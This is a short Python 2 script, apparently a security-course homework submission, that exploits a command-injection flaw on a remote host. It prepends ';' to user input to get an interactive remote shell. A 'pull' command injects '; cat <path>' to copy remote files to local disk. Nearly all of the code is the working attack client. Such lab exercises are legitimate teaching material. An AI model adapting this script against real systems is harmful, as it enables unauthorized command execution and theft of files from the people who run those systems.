"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import os 

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

if __name__ == '__main__':
    while (True): #iterate until quit keyword found
        cmd= raw_input("")  
        s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))
 
        if (cmd == 'shell'):
            cmd= ";"
            while (True):
                s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host,port))
                cmd2 = raw_input("")
                fullC= cmd + cmd2 + "\n;"

                if 'cd' in cmd2:
                    cmd+= cmd2 + ";" #keep track of directory changes
                if ('exit' in cmd2):
                    print("Exit interactive shell")
                    break

                s.send(fullC)
                data= s.recv(4096) #disregard header data
                data= s.recv(4096)
                print(data)

        elif ('pull' in cmd):
            arr= cmd.split()
            s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,port))

            s.send("; cat " + arr[1] + "\n")
            data2= s.recv(4096)
            data= s.recv(4096)
            f= open(arr[2], 'w') #some issues navigating to home directory
            f.write(data)
            f.close()
            print("Data pulled")

        elif (cmd == 'help'):
            print("1. shell Drop into an interactive shell and allow users to gracefully exit \n 2. pull <remote-path> <local-path> Download files \n 3. help Shows this help menu \n 4. quit Quit the shell")

        elif (cmd ==  'quit' or cmd == 'q'):
            print("Exiting program...")
            break
